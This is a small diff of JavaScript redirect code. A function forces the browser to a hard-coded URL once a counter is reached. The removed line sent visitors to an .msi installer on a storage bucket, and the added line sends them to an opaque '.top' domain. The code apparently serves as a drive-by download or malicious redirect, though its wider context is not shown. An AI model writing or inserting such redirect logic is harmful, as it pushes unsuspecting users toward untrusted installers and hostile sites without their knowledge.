@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://amnn1.s3.us-east-1.amazonaws.com/Taemsc.msi";
+		var url="https://wosottefot.top";
 		window.location=url;
 	}
 }
@@ -13,3 +13,4 @@ function getLoad()
 	num++;
 
 }
+
